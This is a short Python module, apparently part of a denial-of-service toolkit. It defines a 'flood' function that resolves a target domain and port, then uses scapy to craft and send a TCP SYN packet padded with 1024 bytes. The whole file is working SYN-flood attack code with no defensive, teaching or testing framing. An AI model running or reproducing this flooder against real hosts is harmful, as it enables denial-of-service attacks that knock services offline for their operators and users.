import socket
from random import randint
from typing import Union

from colorama import Fore as F
from scapy.all import Raw, send
from scapy.layers.inet import IP, TCP

from tools.addons.ip_tools import get_target_domain


def flood(target: str) -> None:
    """Send a SYN packet to the target.

    Args:
        - target - The target's address

    Returns:
        None
    """
    try:
        port: Union[str, int]
        domain, port = get_target_domain(target).split(":")
        port = int(port)
    except ValueError:
        domain, port = get_target_domain(target), 80

    ip_addr = socket.gethostbyname(domain)

    ip_layer = IP(dst=ip_addr)
    tcp_layer = TCP(sport=(sport := randint(1024, 65536)), dport=port, flags="S")
    data = Raw(b"X" * 1024)

    packet = ip_layer / tcp_layer / data

    send(packet, verbose=0)
    print(f"--> Socket on Port {F.BLUE}{sport}{F.RESET} sent a SYN packet")
